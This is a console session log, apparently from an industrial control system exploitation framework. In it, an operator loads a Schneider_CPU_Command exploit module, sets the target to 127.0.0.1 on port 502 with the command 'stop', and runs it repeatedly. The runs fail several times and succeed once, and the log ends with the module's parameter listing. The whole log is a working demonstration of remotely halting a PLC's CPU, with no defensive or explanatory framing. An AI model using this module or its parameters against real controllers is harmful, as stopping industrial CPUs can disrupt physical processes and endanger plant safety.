isf > autorun
[*] Autorun ON

Exploit Autorun List
====================

  0) apply
  1) touch all
  2) prompt confirm
  3) execute


Payload Autorun List
====================

  0) apply
  1) prompt confirm
  2) execute


isf > setg ISFStorage D:\isf\isf\storage
[+] Set ISFStorage =>. D:\isf\isf\storage
isf > use Schneider_CPU_Command

[!] Entering Plugin Context :: Schneider_CPU_Command
[*] Applying Global Variables

isf Exploit (Schneider_CPU_Command) > apply
[*] Applying Session Parameters
isf Exploit (Schneider_CPU_Command) > echo Running Exploit Touches
[*] Running Exploit Touches
isf Exploit (Schneider_CPU_Command) > touch all
isf Exploit (Schneider_CPU_Command) > enter Exploit

isf Exploit (Schneider_CPU_Command) > prompt confirm

[!] Enter Prompt Mode :: Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp                                                              
  TargetPort      502                                                   
  Command         stop                                                  

[!] plugin variables are valid

[*]  TargetIp :: Target IP Address

[+] Set TargetIp => 127.0.0.1

[*]  TargetPort :: Target Port

[+] Set TargetPort => 502

[*]  Command :: The control command of cpu [stop/start]

[+] Set Command => stop

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[+] Schneider_CPU_Command Succeeded

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > 
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > 
isf Exploit (Schneider_CPU_Command) > 
isf Exploit (Schneider_CPU_Command) > 
isf Exploit (Schneider_CPU_Command) > 
isf Exploit (Schneider_CPU_Command) > info

Information
===========


    Name: Schneider_CPU_Command
 Version: 1.1.0
    Type: Exploit


Redirection
===========


  Local
  =====

   *Empty* 

  Remote
  ======

   *Empty* 


Parameters
==========


  Name            Value          Description                                           
  ----            -----          -----------                                           
  TargetIp        127.0.0.1      Target IP Address                                     
  TargetPort      502            Target Port                                           
  Command         stop           The control command of cpu [stop/start]               

